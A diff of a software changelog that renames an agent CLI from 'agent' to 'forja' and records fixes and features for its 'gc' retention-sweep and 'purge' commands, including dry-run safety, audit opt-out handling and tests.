-2. Reads dry-run output, sees "To execute: agent gc --force".
+1. Runs `forja gc --table=memory_events` to inspect ONLY one table's deletion impact.
+2. Reads dry-run output, sees "To execute: forja gc --force".
 3. Copy-pastes that line into the shell.
 4. Force run sweeps ALL 10 covered tables, deleting data outside the inspected scope.
 
 The dry-run's purpose is to let the operator validate impact before committing. Losing the scope in the suggestion turns the dry-run into a trap.
 
 **Fix.** New `buildForceCommand(tables: ReadonlyArray<string>): string` helper:
-- Empty `tables` → `'agent gc --force'`
-- Non-empty → `'agent gc --force --table=X --table=Y'` (each filter explicitly echoed)
+- Empty `tables` → `'forja gc --force'`
+- Non-empty → `'forja gc --force --table=X --table=Y'` (each filter explicitly echoed)
 
 Applied to all 5 hardcoded sites in `cli/gc.ts`:
 1. `renderHumanDryRun` final "To execute" line
@@ -6512,10 +7816,10 @@ Applied to all 5 hardcoded sites in `cli/gc.ts`:
 Force-mode JSON still omits `command` entirely (no follow-up to suggest).
 
 **Tests.** 6 new pins in `tests/cli/gc.test.ts` describe `runGcCli — suggested force command preserves scope`:
-- `no --table → "agent gc --force" (unscoped)` — baseline still works.
+- `no --table → "forja gc --force" (unscoped)` — baseline still works.
 - `single --table → preserved in suggestion`
 - `multiple --table → all preserved, order maintained`
-- `human output echoes scoped command` — includes negative polarity assertion (`stdout NOT matching /agent gc --force\n/` to catch regression to bare suggestion).
+- `human output echoes scoped command` — includes negative polarity assertion (`stdout NOT matching /forja gc --force\n/` to catch regression to bare suggestion).
 - `force mode JSON omits command (no follow-up to suggest)`
 - `DB-unreadable dry-run path also preserves scope` — covers the empty-report emergency path, easy regression spot.
 
@@ -6523,16 +7827,16 @@ Force-mode JSON still omits `command` entirely (no follow-up to suggest).
 - 18/18 gc CLI tests pass (was 12, +6 new pins)
 - 79/79 across gc CLI + args-gc + audit/
 - typecheck + lint clean
-- Smoke E2E: `agent gc --table=context_pins --table=bg_processes` in fresh tempdir → output echoes `agent gc --force --table=context_pins --table=bg_processes` in both stderr warning AND suggestion footer.
+- Smoke E2E: `forja gc --table=context_pins --table=bg_processes` in fresh tempdir → output echoes `forja gc --force --table=context_pins --table=bg_processes` in both stderr warning AND suggestion footer.
 
 **Pre-existing operator state.** Operators who copy-pasted the bare suggestion from a scoped dry-run before this fix may have swept tables outside their intended scope. No automated recovery — the deletions are by-table-retention-windows, idempotent on re-run; operator who wanted narrower scope can re-establish their config and let normal retention rebuild the dataset over time (or restore from backup if available).
 
-## [2026-05-19] fix(cli) — `agent purge --no-audit` skips DB probe entirely
+## [2026-05-19] fix(cli) — `forja purge --no-audit` skips DB probe entirely
 
 Third operator-reported bug on the `--no-audit` escape hatch in two commits. Sequence:
 
 1. **First fix (`0747faf`)**: `--no-audit` only honored as an error bypass — healthy DB still wrote a row. Made `--no-audit` the PRIMARY gate so the write was correctly skipped.
-2. **This fix**: even after gating the WRITE, the PROBE (`openDb + migrate`) still ran first. So `agent purge --force --no-audit` on a fresh install CREATED `~/.local/share/forja/sessions.db` and applied 66 migrations to it before the noAudit check fired. Operator opted out of audit logging and still got DB side effects.
+2. **This fix**: even after gating the WRITE, the PROBE (`openDb + migrate`) still ran first. So `forja purge --force --no-audit` on a fresh install CREATED `~/.local/share/forja/sessions.db` and applied 66 migrations to it before the noAudit check fired. Operator opted out of audit logging and still got DB side effects.
 
 The escape hatch is meant for emergencies — DB corrupted, fresh install where the global DB shouldn't exist yet, recovery scenarios where any DB touch is risky. Probing first defeats the entire purpose.
 
@@ -6570,11 +7874,11 @@ Tests in this commit pin both signal paths.
 - 28/28 purge tests pass (was 27, +1 new pin)
 - 51/51 across purge + args-purge + purge-events repo
 - typecheck + lint clean
-- Smoke E2E: `agent purge --force --no-audit` with non-existent `XDG_DATA_HOME` → FS purge happens, **no DB created**.
+- Smoke E2E: `forja purge --force --no-audit` with non-existent `XDG_DATA_HOME` → FS purge happens, **no DB created**.
 
-**Pre-existing operator state.** Operators who ran `agent purge --force --no-audit` on a fresh install before this fix have an unwanted `~/.local/share/forja/sessions.db` (created by the probe, migrated, but with no rows). Remove via `rm ~/.local/share/forja/sessions.db*` if not used for real session activity.
+**Pre-existing operator state.** Operators who ran `forja purge --force --no-audit` on a fresh install before this fix have an unwanted `~/.local/share/forja/sessions.db` (created by the probe, migrated, but with no rows). Remove via `rm ~/.local/share/forja/sessions.db*` if not used for real session activity.
 
-## [2026-05-19] fix(cli) — `agent gc` dry-run uses readonly DB open (no file/sidecar creation)
+## [2026-05-19] fix(cli) — `forja gc` dry-run uses readonly DB open (no file/sidecar creation)
 
 Operator-reported bug. The dry-run path still called `openDb(dbPath)` before the force check — and `openDb` without `{readonly: true}` does substantial mutation:
 
@@ -6584,13 +7888,13 @@ Operator-reported bug. The dry-run path still called `openDb(dbPath)` before the
 - `PRAGMA busy_timeout = 5000` — sets DB-level setting
 - `chmodSync(path, 0o600)` + `chmodSync(parent, 0o700)` — tightens perms
 
-All of that ran in dry-run, despite the `forja gc — DRY RUN (nothing will be modified)` header. Same shape as the recent purge dry-run fix and the gc Phase 1 C1 fix (migrate-in-dry-run). Caught by operator running `agent gc` on a fresh install — got an unexpected `sessions.db` materialized.
+All of that ran in dry-run, despite the `forja gc — DRY RUN (nothing will be modified)` header. Same shape as the recent purge dry-run fix and the gc Phase 1 C1 fix (migrate-in-dry-run). Caught by operator running `forja gc` on a fresh install — got an unexpected `sessions.db` materialized.
 
 **Fix.** `openDb` already supports `{ readonly: true }` (slice 125 for doctor's chain check). In readonly mode it: skips mkdir, skips `create: true` (open throws SQLITE_CANTOPEN on missing file), skips WAL pragma, skips chmod. Pure no-mutation read path.
 
 Split the gc handler's DB open into two branches:
 - **Force**: `openDb(dbPath)` + `migrate(db)` — current behavior; operator opted into mutation.
-- **Dry-run**: `openDb(dbPath, { readonly: true })`. ENOENT on missing file is caught + reported gracefully: stderr "DB not readable in dry-run", exit 0, empty report. Fresh-install operator running `agent gc --json` gets `{tables: [], errors: []}` instead of a crash.
+- **Dry-run**: `openDb(dbPath, { readonly: true })`. ENOENT on missing file is caught + reported gracefully: stderr "DB not readable in dry-run", exit 0, empty report. Fresh-install operator running `forja gc --json` gets `{tables: [], errors: []}` instead of a crash.
 
 **Force-mode behavior on broken DB unchanged.** Operator who explicitly opted into mutation still gets exit 1 with "cannot open DB" message — they need to know.
 
@@ -6604,15 +7908,15 @@ Split the gc handler's DB open into two branches:
 - 12/12 gc CLI tests pass (was 9, +3 net; one test rewritten)
 - 96/96 across gc + audit + gc-prunes
 - typecheck + lint clean
-- Smoke E2E: `agent gc` with `XDG_DATA_HOME` pointing at fresh tempdir → `ls $XDG_DATA_HOME/` returns empty after dry-run; **no DB or sidecar files created**.
+- Smoke E2E: `forja gc` with `XDG_DATA_HOME` pointing at fresh tempdir → `ls $XDG_DATA_HOME/` returns empty after dry-run; **no DB or sidecar files created**.
 
 **Cosmetic side-fix.** Found a leftover "Tables (Phase 1):" header in `renderHumanDryRun` (Phase 2 commit's `replace_all` had missed this one). Changed to "Tables:" matching the force-mode header.
 
-**Pre-existing operator state.** Operators who ran `agent gc` (dry-run) before this fix on a fresh install have an unwanted `~/.local/share/forja/sessions.db` + `-shm` + `-wal`. Remove via `rm ~/.local/share/forja/sessions.db*` if not yet used for real session activity.
+**Pre-existing operator state.** Operators who ran `forja gc` (dry-run) before this fix on a fresh install have an unwanted `~/.local/share/forja/sessions.db` + `-shm` + `-wal`. Remove via `rm ~/.local/share/forja/sessions.db*` if not yet used for real session activity.
 
-## [2026-05-19] fix(cli) — `agent gc` resolves repo root before loading config
+## [2026-05-19] fix(cli) — `forja gc` resolves repo root before loading config
 
-Operator-reported bug. `runGcCli` was passing the raw process `cwd` directly to `loadRetentionConfig`. The loader resolves `<cwd>/.agent/config.toml`, so an operator running `agent gc` from a subdirectory (e.g., `<repo>/src/`) read `<repo>/src/.agent/config.toml` (non-existent) and silently fell back to `DEFAULT_RETENTION`. In `--force` mode that pruned rows using default retention windows instead of the operator's configured policy — data-retention regression.
+Operator-reported bug. `runGcCli` was passing the raw process `cwd` directly to `loadRetentionConfig`. The loader resolves `<cwd>/.forja/config.toml`, so an operator running `forja gc` from a subdirectory (e.g., `<repo>/src/`) read `<repo>/src/.forja/config.toml` (non-existent) and silently fell back to `DEFAULT_RETENTION`. In `--force` mode that pruned rows using default retention windows instead of the operator's configured policy — data-retention regression.
 
 The same handler did the right thing for the FS purge verb (`purge.ts:482 const repoRoot = resolveRepoRoot(cwd)`) and bootstrap already resolves for the harness's call chain (`bootstrap.ts:327 const projectConfigCwd = resolveRepoRoot(cwd)`). Only `cli/gc.ts` missed the resolution — caught by the operator.
 
@@ -6620,7 +7924,7 @@ The same handler did the right thing for the FS purge verb (`purge.ts:482 const 
 
 **Test.** New pin in `tests/cli/gc.test.ts` "runGcCli — repoRoot resolution":
 - `git init` the tempdir
-- write `<cwd>/.agent/config.toml` with `retrieval_trace = 7` (distinctive override)
+- write `<cwd>/.forja/config.toml` with `retrieval_trace = 7` (distinctive override)
 - create `<cwd>/src/` subdir and invoke `runGcCli({ cwd: subdir })`
 - assert `config.retrieval_trace_days === 7` (the override, NOT the 90d default)
 - assert `configSources.project` points at the repo-root config path
@@ -6632,15 +7936,15 @@ Skips gracefully if `git` is unavailable (sandboxed CI) — same posture as the 
 - 80/80 across gc + audit + gc-prunes
 - typecheck + lint clean
 
-**Pre-existing operator state.** Operators who ran `agent gc --force` from a subdirectory before this fix used default retention windows instead of their configured policy. Two cases:
+**Pre-existing operator state.** Operators who ran `forja gc --force` from a subdirectory before this fix used default retention windows instead of their configured policy. Two cases:
 - Defaults were SHORTER than their config (e.g., config wanted 365d for `memory_events`, default applied = 365d — same) → no impact.
-- Defaults were LONGER than their config → rows that should have been deleted survived. Re-run `agent gc --force` from the repo root (or anywhere now post-fix) to apply the correct windows.
+- Defaults were LONGER than their config → rows that should have been deleted survived. Re-run `forja gc --force` from the repo root (or anywhere now post-fix) to apply the correct windows.
 
 No automated cleanup path — rare case + idempotent verb, operator just re-runs.
 
-## [2026-05-19] fix(cli) — `agent purge --no-audit` honors opt-out on healthy DB
+## [2026-05-19] fix(cli) — `forja purge --no-audit` honors opt-out on healthy DB
 
-Operator-reported bug. `--no-audit` was treated as an error bypass only — when the DB was writable, the audit row was written regardless of the flag. So `agent purge --force --no-audit` on a healthy DB still recorded a `purge_events` row, contradicting the documented "opt out of audit logging" intent.
+Operator-reported bug. `--no-audit` was treated as an error bypass only — when the DB was writable, the audit row was written regardless of the flag. So `forja purge --force --no-audit` on a healthy DB still recorded a `purge_events` row, contradicting the documented "opt out of audit logging" intent.
 
 The pre-fix branching was:
 ```ts
@@ -6676,11 +7980,11 @@ So an operator reviewing stderr knows whether they intentionally opted out OR wh
 - 50/50 across purge + args-purge + purge-events repo
 - typecheck + lint clean
 
-**Pre-existing operator state.** Operators who ran `agent purge --force --no-audit` before this fix on a healthy DB have spurious `purge_events` rows recorded. They can leave them (forensic noise, harmless) or DELETE explicitly via SQL — no automated cleanup path provided (rare case, doesn't justify a verb).
+**Pre-existing operator state.** Operators who ran `forja purge --force --no-audit` before this fix on a healthy DB have spurious `purge_events` rows recorded. They can leave them (forensic noise, harmless) or DELETE explicitly via SQL — no automated cleanup path provided (rare case, doesn't justify a verb).
 
-## [2026-05-19] fix(cli) — `agent purge` dry-run no longer mutates DB schema
+## [2026-05-19] fix(cli) — `forja purge` dry-run no longer mutates DB schema
 
-Operator-reported bug. `agent purge` (without `--force`) was calling `probeAuditWritability`, which in turn called `openDb(dbPath)` + `migrate(db)` before the dry-run early return. Consequences:
+Operator-reported bug. `forja purge` (without `--force`) was calling `probeAuditWritability`, which in turn called `openDb(dbPath)` + `migrate(db)` before the dry-run early return. Consequences:
 
 - **Created** `~/.local/share/forja/sessions.db` if absent (the openDb side effect on first call).
 - **Applied** any pending migrations to an existing DB.
@@ -6702,13 +8006,13 @@ Trade-off in the non-mutating probe: a chmod 0444 DB file with writable parent r
 **Verification:**
 - 25/25 purge tests pass (was 23, +2 new pins)
 - typecheck + lint clean
-- Smoke E2E: `agent purge` in tempdir with XDG_DATA_HOME isolated → `ls $XDG_DATA_HOME/` empty after dry-run, **no DB created**.
+- Smoke E2E: `forja purge` in tempdir with XDG_DATA_HOME isolated → `ls $XDG_DATA_HOME/` empty after dry-run, **no DB created**.
 
-**Pre-existing operator state.** Operators who hit this bug AND ran `agent purge` (without --force) before the fix have a `~/.local/share/forja/sessions.db` with unwanted state. If they want it removed: `rm ~/.local/share/forja/sessions.db*`. No data migration needed — fresh DB on next bootstrap.
+**Pre-existing operator state.** Operators who hit this bug AND ran `forja purge` (without --force) before the fix have a `~/.local/share/forja/sessions.db` with unwanted state. If they want it removed: `rm ~/.local/share/forja/sessions.db*`. No data migration needed — fresh DB on next bootstrap.
 
-## [2026-05-19] feat(cli + audit) — `agent gc` Phase 2 audit-cascade tables (post-work)
+## [2026-05-19] feat(cli + audit) — `forja gc` Phase 2 audit-cascade tables (post-work)
 
-Closes the pre-work entry below. Single branch `feat/purge-command`. Brings the gc roadmap from "Phase 1 + Stop hook shipped" to "Phase 1 + 2 + Stop hook shipped" — `agent gc` now covers 10 tables, the ones that grow fastest in normal use (memory_events, hook_runs, failure_events, eviction_events, outcomes, outcome_signals).
+Closes the pre-work entry below. Single branch `feat/purge-command`. Brings the gc roadmap from "Phase 1 + Stop hook shipped" to "Phase 1 + 2 + Stop hook shipped" — `forja gc` now covers 10 tables, the ones that grow fastest in normal use (memory_events, hook_runs, failure_events, eviction_events, outcomes, outcome_signals).
 
 **Round-of-review fixes that landed BEFORE commit** (self-review caught 3 issues — 1 critical, 2 quality):
 
@@ -6774,7 +8078,7 @@ Deferred review items: M2 (`default_days` silently swallow), M4 (padEnd(18) brea
 - `bun run lint`: clean (928 files; Biome auto-fix for one formatting nit in audit/gc.ts)
 - 91/91 gc tests pass (was 71, +20 new)
 - 136 adjacent tests pass (bootstrap, eviction-events, outcomes)
-- Smoke E2E: `agent gc` in isolated tmpdir lists all 10 tables in error path (DB empty, no migrations applied — expected); pending-migration warning fires correctly (C1 fix from prior slice still working).
+- Smoke E2E: `forja gc` in isolated tmpdir lists all 10 tables in error path (DB empty, no migrations applied — expected); pending-migration warning fires correctly (C1 fix from prior slice still working).
 
 **Items NOT addressed** (logged for follow-up):
 
@@ -6785,7 +8089,7 @@ Deferred review items: M2 (`default_days` silently swallow), M4 (padEnd(18) brea
 
 **Production-readiness shift.** Before: even with Phase 1 + cron + Stop hook, the tables that grow fastest in real use (memory_events, hook_runs, outcome_signals) accumulated indefinitely. After: 10 of the 14 audit tables are swept automatically with operator-set retention windows. Remaining 4 (approvals_log, sessions + cascade, prompt_versions, policies — last two are "forever" by design) need Phase 3/4 for the chain-aware tables and Phase 4 for sessions, but the operator-visible gap is mostly closed.
 
-## [2026-05-19] feat(cli + audit) — `agent gc` Phase 2 audit-cascade tables (pre-work plan)
+## [2026-05-19] feat(cli + audit) — `forja gc` Phase 2 audit-cascade tables (pre-work plan)
 
 Phase 1 (4 low-sensitivity tables) shipped, plus Stop hook built-in (`run_gc_on_stop`). This slice ships Phase 2 — the 6 audit-cascade tables that grow fastest in real usage (every tool call → `outcome_signals`; every failure → `failure_events`; every memory op → `memory_events`). Without Phase 2, the "archaeological trail" still dominates the DB even with Phase 1 + cron + Stop hook enabled.
 
@@ -6845,7 +8149,7 @@ Each mirrors the `pruneVerifyAttempts` shape; input validation `olderThanMs > 0`
 
 Same branch `feat/purge-command`. Post-work entry follows once code + tests land.
 
-## [2026-05-19] feat(harness + audit) — `agent gc` built-in on Stop hook (post-work)
+## [2026-05-19] feat(harness + audit) — `forja gc` built-in on Stop hook (post-work)
 
 Closes the pre-work entry below. Phase 5 piece of the gc roadmap that shipped (the other Phase 5 piece, `--reclaim-space`, still deferred). Single branch `feat/purge-command`.
 
@@ -6859,7 +8163,7 @@ Closes the pre-work entry below. Phase 5 piece of the gc roadmap that shipped (t
 **Operator surface** (full config example for clarity):
 
 ```toml
-# ~/.config/agent/config.toml  OR  <cwd>/.agent/config.toml
+# ~/.config/forja/config.toml  OR  <cwd>/.forja/config.toml
 
 [audit]
 run_gc_on_stop = true            # default: false (opt-in)
@@ -6906,7 +8210,7 @@ bg_processes   = 30
 
 **Production-readiness shift.** Before this slice: operator wanting automatic hygiene had to set up cron (`crontab -e`). After: one config line + zero infra. The gc roadmap's most-asked-for piece (Stop hook integration) now ships; the remaining Phase 5 piece (`--reclaim-space`) is a niche need that can wait for a concrete request.
 
-## [2026-05-19] feat(harness + audit) — `agent gc` built-in on Stop hook (pre-work plan)
+## [2026-05-19] feat(harness + audit) — `forja gc` built-in on Stop hook (pre-work plan)
 
 The gc Phase 1 entry below deferred "Stop hook integration" to Phase 5. This slice ships exactly that piece — operator declares `[audit] run_gc_on_stop = true` in `config.toml`, and the harness automatically runs `gc --force` at the end of every session. Cron-friendly hygiene without the operator wiring crontab.
 
@@ -6927,7 +8231,7 @@ The gc Phase 1 entry below deferred "Stop hook integration" to Phase 5. This sli
 
 **Phase 2 — Bootstrap + harness wiring.**
 
-- `src/cli/bootstrap.ts` — calls `loadRetentionConfig({cwd})` (already does today for `agent gc`); threads the resolved `RetentionConfig` into the `HarnessConfig` shape.
+- `src/cli/bootstrap.ts` — calls `loadRetentionConfig({cwd})` (already does today for `forja gc`); threads the resolved `RetentionConfig` into the `HarnessConfig` shape.
 - `src/harness/types.ts:HarnessConfig` — new `auditRetention?: RetentionConfig` field. Optional so existing call sites (tests, subagent runtime) don't need to populate it when they have no audit concerns.
 - `src/harness/loop.ts:~700` — after `dispatchHooks Stop` returns, check `config.auditRetention?.runGcOnStop === true`. If true, call `runGc({db, config: auditRetention, nowMs: Date.now(), dryRun: false})` synchronously inside a try/catch. Errors → stderr via existing `process.stderr.write` (matches the pattern used for outcome_signals emit failures on the same code path).
 
@@ -6944,7 +8248,7 @@ The gc Phase 1 entry below deferred "Stop hook integration" to Phase 5. This sli
 
 Same branch `feat/purge-command`. Post-work entry follows once code + tests land.
 
-## [2026-05-19] feat(cli + audit) — `agent gc` Phase 1 (post-work)
+## [2026-05-19] feat(cli + audit) — `forja gc` Phase 1 (post-work)
 
 Closes the pre-work entry below. Single branch `feat/purge-command` (gc shares the branch with purge — both are operator-fired DB / FS lifecycle verbs that compose).
 
@@ -6952,11 +8256,11 @@ Closes the pre-work entry below. Single branch `feat/purge-command` (gc shares t
 
 - **C1 — `migrate(db)` in dry-run violated the "dry-run mutates nothing" contract.** Initial draft called `migrate(db)` unconditionally inside `runGcCli`. Any pending migration would have applied silently on a dry-run, mutating the schema before the operator opted into anything destructive. Fix split the path: `--force` calls `migrate(db)` (idempotent, expected); dry-run calls the new read-only `countPendingMigrations(db)` helper (exported from `src/storage/migrate.ts`) and emits a stderr warning if any migrations are pending — schema stays untouched. Dry-run hash-mismatch on already-applied migrations is the one trade-off we accept (surfaces on the next real `migrate` call); documented in the helper header.
 - **C2 — `KNOWN_GC_TABLES` (args.ts) duplicated `PHASE_1_TABLES` (audit/gc.ts).** Same drift bug shape as the purge `INIT_MARKERS` ↔ `DEFAULT_STEPS` review-round catch — two manually-synced lists for the same set. Phase 2 would have required editing both files in lockstep without a drift-guard. Fix derives `KNOWN_GC_TABLES = new Set(PHASE_1_TABLES)` directly in `args.ts`; single source of truth in the audit module. Drift is impossible by construction; no separate drift-guard test needed.
-- **C3 — `configSources` returned resolved paths even when the underlying file did not exist.** The renderer would emit "Config source: /tmp/foo/.agent/config.toml (project overrides …)" even when no such file was on disk — defaults were quietly in effect. Misleading for operators trying to trace surprising deletes back to a misconfig. Fix gates `sources.user` / `sources.project` on `existsSync`; renderer's existing fallback ("Config source: defaults") finally fires correctly. Two new test cases pin both polarities (file present → path returned; file absent → null).
+- **C3 — `configSources` returned resolved paths even when the underlying file did not exist.** The renderer would emit "Config source: /tmp/foo/.forja/config.toml (project overrides …)" even when no such file was on disk — defaults were quietly in effect. Misleading for operators trying to trace surprising deletes back to a misconfig. Fix gates `sources.user` / `sources.project` on `existsSync`; renderer's existing fallback ("Config source: defaults") finally fires correctly. Two new test cases pin both polarities (file present → path returned; file absent → null).
 
 The review also flagged lower-priority items deferred for follow-up: asymmetric `tables: []` vs `tables: undefined` semantics in the orchestrator (M1), `default_days` silently ignored (M2), no `gc_events` audit row (M3 — Phase 3 concern when approvals_log lands), `padEnd(18)` breaks on long Phase 2 names (M4), JSON dry-run/force shape divergence (M5). Logged but not blocking — they don't affect Phase 1 correctness.
 
-**Outcome.** New top-level verb `agent gc [--force] [--json] [--table=X]` materializes the retention contract declared in `AUDIT.md §1.2`. Bare invocation is dry-run (counts "would delete" per table); `--force` executes the sweep; `--table=X` restricts to one of the Phase 1 tables (repeatable). Cross-project by design (age-based, not cwd-based), composes with cron and the future `Stop` hook.
+**Outcome.** New top-level verb `forja gc [--force] [--json] [--table=X]` materializes the retention contract declared in `AUDIT.md §1.2`. Bare invocation is dry-run (counts "would delete" per table); `--force` executes the sweep; `--table=X` restricts to one of the Phase 1 tables (repeatable). Cross-project by design (age-based, not cwd-based), composes with cron and the future `Stop` hook.
 
 **Phase 1 tables shipped (4):**
 
@@ -6976,7 +8280,7 @@ The review also flagged lower-priority items deferred for follow-up: asymmetric 
 
 - **Reuse `purgeExpiredRecapCache` (semantic `<=`) instead of shipping a parallel `pruneExpiredRecapCache` (semantic `<`).** The existing helper is what the read-path eviction also calls; a divergent boundary in the gc helper would mean two paths could disagree on whether a row with `expires_at == nowMs` is fresh. Loop-fix during dev — first draft created the duplicate, code review caught it before commit.
 - **Errors are per-table best-effort.** A single table failing (FK violation, lock conflict, whatever) does NOT abort the orchestrator — the report carries `errors[]` and the CLI exits code 2 (vs 0 for clean, 1 for hard failure). This keeps a single broken table from blocking hygiene on the other three.
-- **`--no-audit` does NOT exist** (contrast with `agent purge`). GC IS the audit hygiene — there's no row to skip.
+- **`--no-audit` does NOT exist** (contrast with `forja purge`). GC IS the audit hygiene — there's no row to skip.
 - **Phase 2+ retention keys silently accepted.** Operators following `AUDIT.md §1.2` already write `approvals_log = 365` etc. in their config; warning "unknown key" for spec-compliant keys would noise the dry-run. Phase 2 wiring activates them at runtime without re-touching the loader.
 - **Typo guard via `KNOWN_SCHEMA_KEYS` set.** Wrong but well-intentioned (`retreival_trace = 90`) surfaces a warning so the operator catches the misconfig before running `--force`.
 - **Dedicated `src/audit/` subsystem dir.** Loader + orchestrator live here. CLI handler stays in `src/cli/gc.ts` for visibility / discoverability. Keeps the boundary clean for Phase 2/3 expansion.
@@ -6985,7 +8289,7 @@ The review also flagged lower-priority items deferred for follow-up: asymmetric 
 
 - `AGENTIC_CLI.md §2.1` — `Gc` row added to the modes table.
 - `AGENTIC_CLI.md §2.1.3` (new) — phase-1 scope (4 tables), dry-run vs `--force`, `--table=X`, `--json` shape, "Phase 1 tables covered" table, "tables fora do Phase 1" with explicit deferral pointers, config layering (mirrors `[critique]` / `[budget]`), DEFAULT_RETENTION matching AUDIT §1.2, "o que NÃO faz" (cross-refs purge, vacuum-per-project, privacy GDPR).
-- `AUDIT.md §1.2` already prescribed `agent gc` and the retention defaults — no edit needed.
+- `AUDIT.md §1.2` already prescribed `forja gc` and the retention defaults — no edit needed.
 
 **Code deltas (8 files):**
 
@@ -7002,20 +8306,20 @@ The review also flagged lower-priority items deferred for follow-up: asymmetric 
 - `tests/storage/gc-prunes.test.ts` (10) — per-helper pins: `purgeExpiredRecapCache` boundary, cutoff EXCLUSIVE for the 3 day-based prunes, **bg_processes never deletes running rows regardless of age**, input validation rejects non-positive ms.
 - `tests/audit/config-loader.test.ts` (23) — `parseTtlMs` accepts h/m/s/ms + bare ms, rejects floats/unknown units/bare-string-numbers; `parseDays` rejects floats / non-numbers; loader: defaults, user-overrides, project-overrides-user per-key, unknown-key typo warning, Phase 2+ keys silent, invalid value falls back, TOML parse error, `[audit]` without `.retention`, `[audit.retention]` not-a-table; **C3 pins**: sources reflect file existence (present → path, absent → null, mixed user/project case).
 - `tests/audit/gc.test.ts` (5) — orchestrator: dry-run reports + idempotency, force happy path + running-bg protected even at 100d age, `--tables` filter restricts, empty filter is "none" (caller signaled nothing), input validation.
-- `tests/cli/gc.test.ts` (10) — CLI end-to-end: dry-run human + JSON shapes, `--table` filter, `--force` JSON has no `command` field, config provenance (`.agent/config.toml` overrides default), warnings surface on stderr, DB inaccessible returns exit 1.
+- `tests/cli/gc.test.ts` (10) — CLI end-to-end: dry-run human + JSON shapes, `--table` filter, `--force` JSON has no `command` field, config provenance (`.forja/config.toml` overrides default), warnings surface on stderr, DB inaccessible returns exit 1.
 
 **Verification:**
 - `bun run typecheck`: clean
 - `bun run lint`: clean (928 files; Biome auto-fix + manual template-literal cleanup)
 - All 59 new tests pass; 338 adjacent-file tests (args, init, index, doctor, db, recap-cache, context-pins, bg-processes) still pass.
 
-**Production-readiness shift.** Before: operator's DB accumulated rows indefinitely; `AUDIT.md §1.2` prescribed the cleanup but no verb materialized it. After: `agent gc` is cron-ready (clean exit codes, NDJSON), composes with `--table=X` for surgical runs, has typo-guarded config, and respects the safety invariant that live bg processes can't be evicted by age. Phase 2/3 (audit-cascade + approvals_log) build on the same skeleton without re-litigating the operator surface.
+**Production-readiness shift.** Before: operator's DB accumulated rows indefinitely; `AUDIT.md §1.2` prescribed the cleanup but no verb materialized it. After: `forja gc` is cron-ready (clean exit codes, NDJSON), composes with `--table=X` for surgical runs, has typo-guarded config, and respects the safety invariant that live bg processes can't be evicted by age. Phase 2/3 (audit-cascade + approvals_log) build on the same skeleton without re-litigating the operator surface.
 
-## [2026-05-19] feat(cli + audit) — `agent gc` Phase 1 (pre-work plan)
+## [2026-05-19] feat(cli + audit) — `forja gc` Phase 1 (pre-work plan)
 
-`AUDIT.md §1.2` has prescribed `agent gc` as the retention-sweep verb since v1 of the audit spec ("Cleanup via cron user-side (`agent gc`) or hook `Stop` (configurable)"). It has remained unimplemented — every audit table accumulates rows indefinitely on the operator's DB. Five repos already have `pruneXxx(db, olderThanMs)` helpers (`memory-verify-attempts`, `memory-conflict-attempts`, `memory-verify-override-attempts`, `memory-override-events`, `memory-provenance`) called from boot-time GC paths, proving the pattern works — but the operator-facing CLI verb that consolidates retention across the whole schema doesn't exist.
+`AUDIT.md §1.2` has prescribed `forja gc` as the retention-sweep verb since v1 of the audit spec ("Cleanup via cron user-side (`forja gc`) or hook `Stop` (configurable)"). It has remained unimplemented — every audit table accumulates rows indefinitely on the operator's DB. Five repos already have `pruneXxx(db, olderThanMs)` helpers (`memory-verify-attempts`, `memory-conflict-attempts`, `memory-verify-override-attempts`, `memory-override-events`, `memory-provenance`) called from boot-time GC paths, proving the pattern works — but the operator-facing CLI verb that consolidates retention across the whole schema doesn't exist.
 
-This slice ships **Phase 1** of `agent gc`: the verb itself + config loader + sweeps for the **four lowest-sensitivity tables** that have ZERO chain integrity concerns:
+This slice ships **Phase 1** of `forja gc`: the verb itself + config loader + sweeps for the **four lowest-sensitivity tables** that have ZERO chain integrity concerns:
 
 - `recap_cache` — TTL via `expires_at`; sweep removes rows where `expires_at < now()`. Already documented (`AUDIT §1.2` "1h TTL"). Read path already evicts on miss; sweep is the cron-driven backstop.
 - `retrieval_trace` — 90d via `created_at` (`AUDIT §1.2` + `RETRIEVAL §10.1`). Cascade-detaches from sessions; standalone sweep is the cold-path backstop.
@@ -7024,7 +8328,7 @@ This slice ships **Phase 1** of `agent gc`: the verb itself + config loader + sw
 
 **Deliberately deferred:**
 
-- **`approvals_log`** (Phase 3) — hash-chained; age-based deletion breaks `permission verify`. Requires wiring `chain-rotation` (migration 035 + verb `agent permission rotate-chain`) into an age-based trigger: rotate first, then delete archived rows. Dedicated slice.
+- **`approvals_log`** (Phase 3) — hash-chained; age-based deletion breaks `permission verify`. Requires wiring `chain-rotation` (migration 035 + verb `forja permission rotate-chain`) into an age-based trigger: rotate first, then delete archived rows. Dedicated slice.
 - **Audit tables non-chained but with FK cascades to `sessions`** (Phase 2): `memory_events`, `hook_runs`, `failure_events`, `eviction_events`, `outcomes`, `outcome_signals`. Each has per-table semantics (`outcome_signals.ttl_expires_at` is per-row per-`signal_kind`; `failure_events` carries a per-session chain hash). Worth their own slice for the per-table edge-case review.
 - **`sessions` + cascade** (Phase 4) — when a session is gc'd, FK CASCADE drops ~12 dependent tables. Bigger blast radius, deserves dedicated review.
 - **`--reclaim-space`** (Phase 5) — runs SQLite `VACUUM` after delete to reclaim disk. Lock-global operation, opt-in flag, ships separately.
@@ -7072,9 +8376,9 @@ Each mirrors the `pruneVerifyAttempts` shape — INSERT-time validation (`olderT
 - `--reclaim-space` (Phase 5).
 - `Stop` hook integration (Phase 5).
 
-Post-work entry follows once code + tests land. Same branch `feat/purge-command` — operator-fired retention sweep is the natural sibling to `agent purge` (the per-project FS reset), and the user asked to keep both in flight on this branch.
+Post-work entry follows once code + tests land. Same branch `feat/purge-command` — operator-fired retention sweep is the natural sibling to `forja purge` (the per-project FS reset), and the user asked to keep both in flight on this branch.
 
-## [2026-05-19] feat(cli) — `agent purge` project-scope reset (post-work)
+## [2026-05-19] feat(cli) — `forja purge` project-scope reset (post-work)
 
 Closes the pre-work entry below. Single branch `feat/purge-command`; spec landed before code.
 
@@ -7082,45 +8386,45 @@ Closes the pre-work entry below. Single branch `feat/purge-command`; spec landed
 
